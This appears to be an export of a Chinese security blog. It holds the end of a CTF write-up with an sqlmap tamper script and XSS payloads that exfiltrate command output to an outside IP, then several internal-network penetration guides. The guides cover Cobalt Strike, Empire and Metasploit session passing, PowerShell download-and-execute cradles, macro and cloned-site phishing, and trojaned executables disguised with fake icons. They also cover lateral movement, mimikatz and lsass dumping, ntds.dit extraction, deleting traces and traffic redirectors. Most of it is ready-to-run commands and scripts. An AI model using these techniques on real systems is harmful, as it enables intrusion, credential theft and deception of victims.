CURLOPT_POSTFIELDS, $post);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$ch_out = curl_exec($ch);curl_close($ch); 或者写个sqlmap的tamper, 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom lib.core.enums import PRIORITYfrom pyDes import *import base64__priority__ = PRIORITY.LOWdef des_enc(key, str): print str k = des(key, ECB, pad=None, padmode=PAD_PKCS5) encrypt_str = k.encrypt(str) return base64.b64encode(encrypt_str)def dependencies(): passdef tamper(payload, **kwargs): p = "ip=1&amp;hrUW3PG7mp3RLd3dJu=1&amp;LxMzAX2jog9Bpjs07jP=%s" % payload enc_data = des_enc(bytes("MiaoMiao"), bytes(p)) return enc_data WEB4 一个没过滤的XSS盲打,并且给了一段代码提示. 12345678910111213141516171819202122232425262728type msg struct &#123; Cmd string `json:"cmd"`&#125;func main() &#123; app := sweetygo.New("./", nil) app.GET("/ws", ws) app.RunServer(":8002")&#125;func ws(ctx *sweetygo.Context) &#123; conn, _ := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), 1024, 1024) for &#123; m := msg&#123;&#125; err := conn.ReadJSON(&amp;m) if err != nil &#123; fmt.Println("Error reading json.", err) break &#125; res := exec(m.Cmd) fmt.Println(res) if err = conn.WriteJSON(res); err != nil &#123; fmt.Println(err) break &#125; &#125;&#125; 看上去是在8002端口启了一个websocket server,并且存在命令执行. 所以思路就是利用XSS去请求websocket来执行命令. 另外,如果去读整个dom的话,可以看到其它人插入的XSS,这样就能看到大佬的payload了😁 payload(1): 12345678910111213141516&lt;script&gt; var socket = new WebSocket("ws://127.0.0.1:8002/ws"); socket.onopen = function(e) &#123; socket.send(JSON.stringify(&#123;cmd:"ls"&#125;)) &#125;; socket.onmessage = function (e) &#123; $.ajax( &#123; type: "POST", url: "//ip:1027/", data: JSON.parse(e.data), dataType: "JSON" &#125; ); &#125;; &lt;/script&gt; payload(2): 12345678910111213141516&lt;script&gt; var socket = new WebSocket("ws://127.0.0.1:8002/ws"); socket.onopen = function(e) &#123; socket.send(JSON.stringify(&#123;cmd:"cat flaaaaag.txt"&#125;)) &#125;; socket.onmessage = function (e) &#123; $.ajax( &#123; type: "POST", url: "//ip:1028/",s data: JSON.parse(e.data), dataType: "JSON" &#125; ); &#125;; &lt;/script&gt;]]></content>
      <tags>
        <tag>Write_Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网三基佬之男上♂加男]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%86%85%E7%BD%91%E4%B8%89%E5%9F%BA%E4%BD%AC%E4%B9%8B%E7%94%B7%E4%B8%8A%E2%99%82%E5%8A%A0%E7%94%B7%2F</url>
    <content type="text"><![CDATA[三个基佬之间的会话传递原理都一样，先本工具上开启监听，然后另外的工具开启会话传递，收到会话 Empire♂msf当empire拿到一个shell后，使用interact 主机命令进入交互模式 使用usemodule查看后渗透模块，其中有一个code_execution/invoke_metasploitpayload模块，这个模块可以与msf的web_delivery交互 首先在msf下配置好交互模块 1use exploit/multi/script/web_delivery 然后在empire下配置好交互模块 1usemodule code_execution/invoke_metasploitpayload 此时msf就能得到一个会话 除了这个模块以外，还可以利用code_execution/invoke_shellcode模块 1usemodule code_execution/invoke_shellcode 这个模块的info信息里，lhost和lport都不是必须的，payload也是默认的reverse_https，我们需要修改 msf只需要在exploit/multi/handler模块里选择windows/meterpreter/reverse_httppayload，设置好相关选项即可 此时在empire执行刚刚设置好的模块，msf即可收到一个会话 Empire♂Cobalt Strike首先在cs上创建一个监听器 此时回到empire上 选择模块code_execution/invoke_shellcode，设置好相应的选项 execute后，cs即可收到一个会话 Cobalt Strike♂Empire在empire上开启一个监听 1uselistener http 接着生成一个bin文件进行shellcode注入 1usestager windows/shellcode 然后将生成的bin文件保存到cs的那台机器上 回到cs，进入绘画，使用ps命令查看进程列表 选择pid为684的lsass.exe的进程进行注入 使用命令 1shinject pid x86/x64 可是貌似注入失败了，xp的lsass.exe进程意外终止，xp自动关机 正常情况下注入成功的话，empire会收到一个会话 Cobalt Strike♂msf就拿之前的笔记贴过来吧，举两种方法 在cs上，右键beacon shell选择privoting的socks server 以8888端口为例子 然后进入view的proxy pivots 选中刚刚的代理，点击tunnel，会有一个弹窗 将框里的命令粘贴到msf，就能实现代理转发到msf 另一种方法 首先在msf建立监听 然后在cs中建立一个监听，注意host和port要和msf的监听地址和端口一致 然后选择一个已获得shell的机器右键，选择spawn，选择刚刚的监听 此时msf就获得了一个会话 msf♂Empire将msf会话传递到empire，最好需要system权限，否则可能会出现很多模块使用失败甚至传递会话失败 首先设置监听 然后利用msfvenom生成一个木马 然后在目标机器上运行这个木马，返回一个shell 接着在empire创建一个监听 然后创建一个dll木马payload 接着在msf上使用ps命令查看进程，因为我们的dll文件就是用来注入进程的 接着在background命令返回msf主界面上，选择post/windows/manage/reflective_dll_inject模块来进行dll注入 设置好选项后，run即可在empire返回一个会话 msf♂Cobalt Strike将就用上面的会话 但是实验过程中遇到点坑，上的会话是tcp监听口，而cs上没有tcp监听口，所以我们直接将上面的木马生成监听口改为http就行 并且我在cs上监听自己的本地地址不能传回会话，但是监听cs所在公网ip才能传回会话。明明目标机器就能ping通本地攻击机 后来找到原因了，攻击机不能ping通目标机，新装的虚拟机没注意 首先在cs创建一个监听，因为攻击机不能ping通目标机，所以监听地址填cs服务器所在的公网IP 然后利用上面类似的方法生成一个木马 接着利用msf的post/windows/manage/payload_inject模块，lhost和lport参数要用cs监听的ip和端口号，payload的reverse_tcp也要和cs监听一直 run一下，cs就能收到一个会话 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网三基佬之知根♂知底]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%86%85%E7%BD%91%E4%B8%89%E5%9F%BA%E4%BD%AC%E4%B9%8B%E7%9F%A5%E6%A0%B9%E2%99%82%E7%9F%A5%E5%BA%95%2F</url>
    <content type="text"><![CDATA[Cobalt Strike监听cs里的listener有两个目的： 告诉cs去为任何一种设置建立攻击载荷处理器 通过别名来连接作为参考的处理器和设置信息 在cs中建立一个监听： 点击耳机形状的图标，再点击下方的add按钮，监听设置就是弹出来 cs有两种监听： Beacon 内置监听器，当在目标机器上执行payload后会反弹一个beacon shell回来， 有三种beacon：http(s)、dns、smb Foreign 外部监听器，这个监听器仅仅是给攻击载荷处理器（可以是cs，也可以是msf）提供一个别名 有三种foreign：http(s)、dns、tcp 这样就设置好了一个监听，我们可以在本地尝试一下 在attacks模块里的web drive-by，选择scripted web delivery 这是用来执行powershell单条指令，用来获取目标机器上的beacon 点击launch我们发现自动生成了一条powershell命令 1powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.120.132:80/a'))" 将这段代码在有powershell的windows上运行后，cs就会返回一个beacon 最后一个选项last为一个持续时间，每60秒会发送一次请求 不过需要注意的是，这个不免杀，我在本地测试的时候，火绒报毒，其他杀软估计也差不多 payload在目标机器上执行payload后，目标机器会自动去下载beacon shell代码并运行，然后返回目标系统的beancon shell 创建payload在attacks模块中packages的windows executable中 将生成的payload放到目标机器上执行即可返回一个beacon shell 客户端攻击在attacks模块中web drive-by的system profiler下 配置好后在目标机器上访问连接即可查看到系统的一些信息，例如系统版本，浏览器版本等 hta+文件下载思路先创建一个hta payload，然后利用下载模块将这个payload放进下载的文件中，运行即可返回一个beacon shell 实施先生成一个hta payload，payload有三种：executable、powershell、vba，可执行文件exe和宏vba没那么容易命中，还是选择powershell来搞更容易一点 将生成的hta文件放入下载模块中，下载模块在attacks中web drive-by的host file下 然后在目标机器上访问连接执行就能返回一个beacon shell，前提是该机器能执行powershell shellcodecs还可以生成基于各种语言的shellcode，在attacks中packages的payload ganerator下 包括c、c#、com scriptlet、java、perl、powershell、powershell command、python、raw、ruby、veil、vba 以powershell为例，generate后会生成一个ps1脚本，运行这个脚本 1powershell -exec bypass -command &quot;$&#123;import-module &apos;c:\users\administrator\desktop\payload.ps1&apos;&#125;&quot; 但是执行这个脚本后会一直有一个cmd框，需要手动关闭 钓鱼word宏钓鱼首先建立一个监听 然后在attacks模块下利用packages的ms office macro，选择好刚建立的监听，此时宏就建立好了 点击copy macro复制宏，然后创建一个word或excel文档 进入视图=&gt;宏=&gt;创建 接着在目标机打开office，进入文件=&gt;选项=&gt;信任中心=&gt;信任中心设置，启用宏和信任访问，因为默认这是关闭的，所以这个钓鱼方式其实比较鸡肋 此时在目标机打开这个word文档，即可返回一个shell 克隆网站钓鱼在attacks模块中web drive-by的clone site 填入相应的地址，设置好选项就能clone整个网站进行钓鱼了 此时在浏览器访问地址就能看到一个一摸一样的钓鱼网站 并且在点击登录后，会跳转到正常的登录页面，并验证账户密码是否正确 此时在web log处就能看到记录到的账号密码 当然也可以在克隆网站时，在attack框里加入payload，比如hta文件等，或者用msf生成 钓鱼邮件钓鱼钓鱼邮件模块在attacks中的spear phish中 模块 含义 targets 要发送邮件的目标邮箱 template 发送的邮箱模版，一个eml文件，可以直接在邮箱中导出 attachment 放入弄好的word文件 embed server 搭建好的钓鱼站 mail server 邮件服务器 bounce to 模仿发件人 发送的截图： 向正常的exe文件中插入payload这个模块在attacks中packages的windows dropper下 embedded file是被插入payload的exe文件 在目标机器上运行生成的文件即可返回一个shell 但是生成的文件不太可能让别人随意点击 那么我们来改变一下图标和名字 首先把文件改名，然后压缩添加到压缩文件 接着设置压缩方式为存储，解压选项为创建自解压格式压缩文件 然后进入高级，点击自解压选项，在设置的安装程序框中填入文件名字 然后进入模式，勾选解包到临时文件夹和全部隐藏 接着再进入更新，勾选覆盖所有文件 最后进入文本和图标，在从文件加载自解压文件图标处选择一个文件的图标 确定，确定，大功告成 win10的话就不存在了，直接右键 usb自运行payload这个跟badusb原理类似，模块在attacks中packsges的use/cd autoplay下 这个比较鸡肋，只对xp以下的系统管用 beacon shell命令输入help命令可以看到所有命令集合 输入help 命令可以看到该命令的用法 例子： 1help hashdump 1hashdump 搜集目标机器上的各类信息键盘记录这个模块直接右键目标机器，选择explore=&gt;process list列出进程列表 然后可以直接选中一个进程，点击下面的log keystokes注入键盘记录 此时就能记录到目标机器上的键盘记录了 截屏直接点击screenshot即可完成截屏 浏览器代理选择一个浏览器进程 此时如果代理成功会返回代理服务器地址和端口号 在本地浏览器设置代理，然后在目标机器上登录我的百度账号，刷新一下本地浏览器，发现已经登录上了我的百度云账号，实现了代理 通过powershell渗透框架来拓展攻击先挖个坑，等学了powershell再来填坑 内网穿透端口扫描目前只支持arp、icmp、tcp扫描协议，线程一般开到10就行，太高容易被发现 1portscan 192.168.120.0/24 1-5000 arp 10 端口转发1rportfwd 3389 192.168.120.128 2333 但是不知道为啥不能转发3389 代理转发直接在beacon上右键选择privoting的socks server 以8888端口为例子 然后进入view的proxy pivots 选中刚刚的代理，点击tunnel，会有一个弹窗 将框里的命令粘贴到msf，就能实现代理转发到msf 反向转发通道的建立proxychains可以允许强制使没有设置代理接口的应用使用代理 通过邮件选择pivoting的socks server即可设置 设置一个自定义端口，然后在攻击机里编辑proxychains配置文件 1sudo vim /etc/proxychains.conf 在末尾加上刚刚修改的端口号以及目标机器的IP即可实现代理 使用时在命令前加上proxychains即可 msf+cs首先在msf建立监听 然后在cs中建立一个监听，注意host和port要和msf的监听地址和端口一致 然后选择一个已获得shell的机器右键，选择spawn，选择刚刚的监听 此时msf就获得了一个会话 重定向和前面的原理类似，就是多了一层或两层代理，加大了溯源的难度，实现隐藏自己 首先在cs创建一个监听，回连IP用公网IP，端口80 然后连接到一个Linux肉机上，利用socat（其他转发工具也可以，自带的安全点）做转发（连到windows肉鸡也是一样的，用其他的转发工具就行） 1socat tcp-listen:80,reuseaddr,fork tcp:120.79.2.221:80 &amp; 将本地80端口的数据全部重定向到公网IP的80端口上 此时回到cs创建一个payload，将payload的IP改为肉鸡IP，此时反弹的shell就通过一层跳板回到了我们的攻击机中，可以以此类推建立多层跳板 Empire和cs一样，把Empire搭在公网vps上。Empre和msf类似，都是设置监听然后生成payload或者木马，然后在目标机器上运行，最后反弹shell 设置监听先查看有哪些命令，允许help 设置监听输入listeners即可进入监听，当没有设置任何监听时，会返回 1No listeners currently active 输入uselistener来设置采用什么监听模式，可以通过双击tab来查看有哪些监听模式 以http模式为例，输入uselistener http，查看参数命令为info，和msf的show options一样 可以看到需要的参数都有默认值，可以不用修改，也可以根据自己的需要进行修改，execute启动监听 利用back命令返回上一层，然后可以利用list命令列出listener，删除这个监听可以用kill命令 生成木马输入usestager命令然后空格两次tab就能看到所有模块的木马 multi为通用模块，osx为mac模块，windows为Windows模块 集中常见类型的木马： dll输入usestager windows/dll命令就能选择这个dll类型的木马 设置监听并执行（注意这里和msf不一样，这里的参数严格区分大小写） launcher输入 1launcher &lt;language&gt; &lt;listener&gt; 来生成一段base64编码后的powershell payload 复制这段代码到目标机上执行，或者直接将生成的vbs到目标机器上执行，就能返回一个shell launcher_vbs和前面的dll木马设置类似，设置好监听就可以执行了 目标会生成一个vbs脚本，目标机器上运行就能返回一个shell launcher_bat和前面的vbs一样的，不过这里提供一种思路：将这个bat文件插入到word文档里 打开一个word文档，选择插入的对象，如下图所示设置好 随意选择一个图标并更改文件名字，能达到更好的欺骗效果 受害者打开word文档，并双击这个文件就能返回一个shell macro和cs里的宏设置一样的 ducky小黄鸭，也就是badusb，之前假期玩过这个 然后烧录进badusb插入受害者机器就能返回一个shell了 连接代理在返回shell后，可以利用agents命令列出shell列表，已经提权成功的shell前面有一个星号 然后利用interact命令连接shell 要使用windows的cmd命令时，用shell command格式，和cs的一样 同时可以利用list stale命令列出已经丢失的代理，然后利用remove stale命令删除丢失的代理 msf就不多介绍了，用的比较熟练 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之远程连接]]></title>
    <url>%2F2018%2F04%2F25%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8B%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[内网文件传输powershell文件下载12$d = New-Object System.Net.WebClient$d.DownloadFile("http://test.com/1.txt","c:/1.txt") 执行脚本： 1powershell -ExecutionPolicy Bypass -File .\1.ps1 有时候powershell的执行权限会被关闭，需要用如下命令打开 1powershell set-executionpolicy unrestricted vbs脚本文件下载basic123456789Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)xPost.Open &quot;GET&quot;,&quot;HTTP://192.168.1.1/1.txt&quot;,0xPost.Send()set sGet=createObject(&quot;ADODB.Stream&quot;)sGet.Mode=3sGet.Type=1sGet.Open()sGet.Write xPost.ResponseBodysGet.SaveToFile &quot;c:\1.txt&quot;,2 或者： basic123456789101112Set args=Wscript.ArgumentsUrl=&quot;http://120.79.2.221:8080/i.php&quot;dim xHttp: Set xHttp=createobject(&quot;Microsoft.XMLHTTP&quot;)dim bStrm: Set bStrm=createobject(&quot;Adodb.Stream&quot;)xHttp.Open &quot;GET&quot;,Url,FalsexHttp.Sendwith bStrm .type=1 &apos; .open .write xHttp.responseBody .savetofile &quot;c:\1.txt&quot;,2 &apos;end with 执行命令即可实现下载： 1cscript 1.vbs bitsadmin命令win10、win7、server 2012、server 2008有，server 2003、xp没有 1bitsadmin /transfer n http://test.com/1.txt c:\1.txt 文件共享可视化操作： 打开我的电脑,在界面上方找到映射网路驱动器 然后会进入如下页面，选择一个共享文件夹 此时可能会提示打开网络发现，去高级共享设置里打开就行了 选择好文件夹后点击完成，此时可以在我的电脑里看到映射的网络共享 命令行操作： 利用telnet目标服务器： 1nc -lvp 23 &lt; nc.exe 本地下载端： 1telnet 目标服务器IP 端口 利用hta文件1234567891011121314151617181920212223&lt;html&gt;&lt;head&gt;&lt;script&gt;var Object = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://120.79.2.221：8080/i.php&quot;,false);Object.send();if (Object.Status == 200)&#123; var Stream = new ActiveXObject(&quot;ADODB.Stream&quot;); Stream.Open(); Stream.Type = 1; Stream.Write(Object.ResponseBody); Stream.SaveToFile(&quot;C:\\1.phpt&quot;, 2); Stream.Close();&#125;window.close();&lt;/script&gt;&lt;HTA:APPLICATION ID=&quot;test&quot;WINDOWSTATE = &quot;minimize&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 保存为.hta，但是Windows下并不能直接将文件名改为.hta，需要用rename命令进行改名 利用perl脚本1234#!perl#!/usr/bin/perluse LWP::Simple;getstore("http://120.79.2.221:8080/i.php","/root/Desktop/1.txt"); 运行： 1perl 1.pl 利用python脚本123456#!/usr/bin/pythonimport urllib2u = urllib2.urlopen('http://120.79.2.221:8080/i.php')localFile = open('/root/Desktop/1.txt','w')localFile.write(u.read())localFile.close() 利用ruby脚本12345678#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("http:120.79.2.221:8080")&#123; |http| r=http.get("/i.php") open("root/Desktop/1.txt","wb")&#123; |file| file.write(r.body ) &#125;&#125; PHP脚本下载1234567&lt;?php $data=@file(&quot;http://120.79.2.221:8080/i.php&quot;); $lf=&quot;1.txt&quot;; $fh=fopen($lf,&quot;w&quot;); fwrite($fh,$data[0]); fclose($fh);?&gt; 需要注意的是，测试发现只能下载txt文件，并且只能保存为txt文件 wget文件下载1wget http://120.79.2.221:8080/i.php -P /root/Desktop 一边打包一边ssh上传一边解压 1tar czf - 1.txt | ssh root@120.79.2.221 tar xzf - -C /root/67 dns数据传输1tar zcf - ftp文件传输上传： 123put c:\1.txtsend c:\1.txtmput c:\*.txt 下载: 12345lcd c:\dir \\设置当前工作路径get 1.txt \\下载1.txtmget *.txt \\下载多个文件!chdir \\查看当前目录!dir \\查看当前目录文件 nc文件传输主动下载 服务器端： 1cat 1.txt | nc -l 1234 下载端： 1nc 192.168.120.132 1234 &gt; 1.txt 但是不清楚为什么下载的文件是空的 主动发送 下载端： 1nc -l -p 1234 &gt; 1.txt 服务器端： 12nc 192.168.1.181 1234 &lt; 1.txtnc 192.168.1.181 1234 &lt; $&#123;tar -jcvf 1.tar.bz2 1.txt&#125; //压缩后发送 smb文件传送服务端Linux的smb环境配置，编辑/etc/samba/smb.conf 123456[share] comment = my share directory path = /home/share; browseable = yes writable = yes guest ok = yes 然后重启samba服务 下载端： 12net use o: \\192.168.120.128\sharedir o: 文件编译利用powershell进行文件编译exe2text.ps1 12[byte[]] $hexdump = get-content -encoding byte -path "nc.exe"[System.IO.File]::WriteAllLines("nc.txt",([string]$hexdump)) text2exe.ps1 123[String]$hexdump = get-content -path "nc.txt"[Byte[]] $temp = $hexdump -split ' '[System.IO.File]::WriteAllBytes("shell2.exe",$temp) 执行命令： 12powershell -ExecutionPolicy Bypass -File .\exe2text.ps1powershell -ExecutionPolicy Bypass -File .\text2exe.ps1 利用csc.exe编译源码csc.exe存在路径为(依版本不同路径有细微差别)： 1C:\Windows\Microsoft.NET\Framework\v4.0.30319&gt; 1csc.exe /out:C:\1.exe C:\1.cs 利用debug的hex功能将hex文件转换为exe文件 debug只有server 2003才有 利用思路： 123把需要上传的exe转成16进制通过echo命令将16进制数据写入文件（每次写入的长度有限制）使用debug功能将16进制还原exe文件 l3m0n师傅给出了一个debug_nc_file.bat，运行这个文件就能写入1.dll、123.hex、nc.exe 远程连接、代码执行at&amp;schtasks查看所有连接 1net use 开启一个ipc$连接 1net use \\192.168.120.67\ipc$ 密码 /user:用户名 复制写入文件 1copy 1.bat \\192.168.120.67\c$ 查看目标服务器时间 1net time \\192.168.120.67 添加at任务 1at \\192.168.120.67 8:00(8:00pm) \\192.168.120.67\c$\1.bat 查看添加的所有at任务列表，执行过的不能查看 1at \\192.168.120.67 映射共享磁盘到本地 1net use z: \\192.168.120.67\c$ 密码 /user:用户名 删除共享映射 1net use * /del 删除连接 1net use \\192.168.120.67 /del 需要注意的是需要开启tasks scheduler服务。如果at命令后提示找不到网络路径，则目标机器禁用了这个服务 pstools这是微软官方的工具，有12款小工具。所有的pstool在第一次运行时都会有弹窗，但是可以用-accepteula参数绕过 首先建立一个ip$连接 1net use \\192.168.120.67 密码 /user:用户名 12款工具分别为： 123456789101112PsExec:远程执行进程PsFile:显示远程打开的文件PsGetSid:显示计算机或用户的sidPsInfo:列出有关系统的信息PsKill:按名称或进程ID终止进程PsList:列出有关进程的详细信息PsLoggedOn:查看在本地通过资源共享登录的用户PsLogList:转存时间日志记录PsPasswd:更改账户密码PsService:查看和控制服务PsShutdown:重启机器PsSuspend:暂停进程 wmicnet use建立ipc连接后，可以利用wmic命令来执行命令 123net use \\192.168.120.67 密码 /user:用户名copy 1.txt \\192.168.120.67\c$\windows\temp\1.txtwmic /node:192.168.120.67 /user:用户名 /password：密码 process call create c:\window\temp\1.txt wmiexec.vbs半交互模式 1cscript //nologo wmiexec.vbs /shell ip 用户名 密码 单命令执行（一次只能执行一次命令） 1cscript wmiexec.vbs /cmd ip 用户名 密码 &quot;命令&quot; wce_hash注入 据说wce是与gethashes和mimikatz齐名的一款hash管理工具 如果抓取的LM hash是AAD3开头，或No password之类的，就用32个0代替LM hash 1wce.exe -s 用户名:对方机器名或者ip:LM-HASH:NTLM-HASH 但是抓不到LM抓不到，不知道该怎么利用 在08上能抓到LM，可以利用 另外柠檬师傅提到wmi只是创建进程，不能判断一个进程是否执行完成，这样导致wmi.dll不能删除，下一次执行的时候会提示被占用，这时只用修改vbs脚本里的名字就行 1Const FileName = &quot;wmi1.dll&quot; 也可以在后台运行，加入-persist参数即可 smbexec可以根据其他共享来获取一个cmd先把execserver.exe复制到目标的windows目录下，接着在本机执行 1test.exe ip 用户名 密码 命令 分析名 具体步骤为 123net use \\192.168.120.67\ipc$ Luoxuan6721. /user:administratorcopy execserver.exe \\192.168.120.67\c$\windowstest.exe 192.168.120.67 administrator Luoxuan6721. whoami c$ schtasks计划任务远程执行1schtasks /create /tn 计划任务名 /tr 执行程序 /sc 执行选项 [/mo modifier] [/d day] [/s 主机] [/ru 用户名] [/st 时间] 例子： 12schtasks /create /tn test /tr c:\1.exe /sc once /st 00:00:00 /s 192.168.120.67 /ru administratorschtasks /run /tn test /s 192.168.120.67 PTH+compmgmt.msc这个还没怎么搞懂，等py一波师傅再说 路还很长]]></content>
      <tags>
        <tag>内网渗透</tag>
        <tag>远程操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之hash抓取]]></title>
    <url>%2F2018%2F04%2F25%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8Bhash%E6%8A%93%E5%8F%96%2F</url>
    <content type="text"><![CDATA[本机hash+明文抓取get-passhashes.ps1 1powershell -ExecutionPolicy Bypass -File .\get-passhashes.ps1 reg命令 1reg save hklm\sam sam.hive .hive文件可以用cain工具打开 在cracker模块里选择add to list，点击import hashes from a sam database，然后next就能解析文件了 QuarkPwDump 1QuarkPwDump.exe -dhl -o &quot;C:\Users\Administrator\Desktop\1.txt&quot; gatpass 可以实现抓取密码，但是火绒会报毒，那360和腾讯多半也会报 1GetPassword_x64.exe mimikatz 直接获取内存中的明文密码 只能抓取登录过的用户 12privilege::debugsekurlsa::logonpasswords 在webshell中抓取明文密码 1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; passwd.txt 利用powershell加载mimikatz抓取密码 1powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz 其中的链接是公网上的powershell加载mimikatz脚本，此时并不需要目标机器上有mimikatz procdump+mimikatz分析，效率较低，但是可以绕过杀软 在目标机器上dump密码 1procdump.exe -accepteula -ma lsass.exe lsass.dmp 然后将这个dmp文件导到本地，利用mimikatz进行分析 123mimikatz.exeseturlsa::minidump lsass.dump.dmpsekurlsa::logonpasswords full ntds.dit+QuarkPwDump分析 1.ntds.dit的导出 12345ntdsutilsnapshotactivate instance ntds //如果在非域控的机器上执行这个命令会报错createmount **** 或者： 1234ntdsutil snapshot &quot;activate instance ntds&quot; create quit quitntdsutil snapshot &quot;mount ***&quot; quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot &quot;unmount ***&quot; &quot;delete ***&quot; quit quit 然后复制这个快照 1copy C:\快照名\windows\ntds\ntds.dit c:\ntds.dit 接着卸载删除这个快照 1234unmount ***del ***quitquit 然后利用quarkPwDump导出hash 1QuarkPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit 但是我在08和12上都试了下，都没成功 实战流程 柠檬师傅给出的实战流程： shadow copy.bat: 1234567891011setlocalset WORK_PATH=C:\windows\tasks\if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%systemDrive%set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.ditset TEMP_GENERATED_SCRIPT=%WORK_PATH%GeneratedvarsTempscript.cmdset CALLBACK_SCRIPT=%~dpnx0"%WORK_PATH%vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%exit 建立ipc$链接 1net use \\192.168.120.67\c$ 密码 /uer:用户名 复制写入文件 1copy .\* \\192.168.120.67\windows\tasks sc建立远程服务启动程序 1sc \\192.168.120.67 create backupntds binPath=&quot;cmd /c start c:\windows\tasks\shadowcopy.bat&quot; type=share start=auto error=ignore DisplayName=BackupNTDS 指定用户权限 1sc \\192.168.120.67 create test binpath=&quot;c:\1.exe&quot; obj=&quot;test/administrator&quot; password=123 启动服务 1sc \\192.168.120.67 start backupntds 删除服务 1sc \\191.168.120.67 delete backupntds 将hash导到本地 1move \\192.168.120.67\c$\windows\tasks\hash.txt 删除记录文件 1del \\192.168.120.67\c$\windows\tasks\ntds.dit \\192.168.120.67\c$\windows\tasks\QuarksPwDump.exe \\192.168.120.67\c$\windows\tasks\shadowcopy.bat \\192.168.120.67\c$\windows\tasks\vshadow.exe 但是我在复现的时候发现不能创建dit快照，先挖个坑吧，等入门后再来填坑，估计是bat文件的问题 vssown.vbs+libesedb+NtdsXtract分析 先利用vssown.vbs导出system和ntds.dit文件 123456cscript vssown.vbs /startcscript vssown.vbs /statuscscript vssown.vbs /create Ccscript vssown.vbs /listcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\windows\ntds\ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\windows\system32\config\system 为了防止管理员发觉，一定要删除快照 1cscript vssown.vbs /delete * 搭建libesedb环境，使用ntdsxtract工具进行分析： 1234567891011121314wget https://github.com/libyal/libesedb/releases/tag/20170121/libesedb-experimental-20170121.tar.gz //此方法不可行，需要自己去github下载后解压，否则解压时会报错tar zxvf libesedb-experimental-20170121.tar.gzcd libesedb-20170121/./configuremakecd esedbtools/./esedbexport ./ntds.dit //ntds.dit为刚导出的快照mv ntds.dit.export/ ../../ntdsxtract工具的安装:git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py installpython groups.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes &apos;/root/SYSTEM&apos; //把刚导出的system放到/root/SYSTEM目录下 NTDSDump 需要两个文件，一个是ntds.dit，另一个是system.hiv 1NTDSDump.exe -f ...\ntds.dit -s system.hiv 可是一直报错，修复数据库也没用，再挖个坑吧 利用powershell分析hash需要的环境为powershell2.0+，.net framework 4.0+ powershell查看版本 1$PSVersionTable.PSVersion 或 1Get-Host | Select-Object Version framework查看版本 浏览器输入 1javascript:alert(navigator.userAgent);java 接着需要利用vshadow和reg来获取ntds.dit和system，因为这两个文件是必须的 执行命令： 123set-ExecutionPolicy Unrestricted //允许执行脚本Import-Module .\DSInternals //powershell 5.0Install-Module DSInrenals 分析hash 12$key=Get-BootKey -SystemHivePath &apos;...\SYSTEM&apos;Get-ADDBAccount -All -DBPath &apos;...\ntds.dit&apos; -BootKey $key | Out-File hash.txt 路还很长]]></content>
      <tags>
        <tag>内网渗透</tag>
        <tag>hash抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之端口及代理转发]]></title>
    <url>%2F2018%2F04%2F25%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8B%E7%AB%AF%E5%8F%A3%E5%8F%8A%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[跟着l3m0n师傅那篇文章来动手做一遍，再加入一些自己的拓展及理解 端口转发工具windowslcx lcx是一款强大的内网端口转发工具，前提是目标服务器必须要能访问外网 先在本机设置监听： 1lcx -listen 1111 2222 其中1111位转发端口，2222位任意未被占用端口 在目标机上开启转发： 1lcx -slave 本机IP 1111 127.0.0.1 3389 然后就可以在本机上直接连接目标机3389端口了 1mstsc 127.0.0.1:2222 但是我在本地练习的时候每次连接一会就会出现lcx.exe停止工作 除此之外，还可以利用VPS的lcx来进行内网映射 123vps:lcx.exe -listen 8080 80目标服务器：lcx.exe -slave vps_ip 80 本机IP 80本地电脑：http://vps_ip:8080 原理和上面一样 netsh netsh是Windows自带的端口转发工具，只支持tcp协议 需要一台双网卡的服务器，在虚拟机上实验时，只需要增加一个IP就行 如果是在xp上还需要安装ipv6 添加转发规则 1netsh interface portproxy set v4tov4 listenaddress=本地IP lestenport=本地端口 connectaddress=目标IP connectport=目标端口 添加防火墙入站规则 1netsh advfirewall firewall add rule name=&quot;transit test&quot; protocol=TCP dir=in localport=7777 action=allow 查看转发规则 1netsh interface portproxy show all 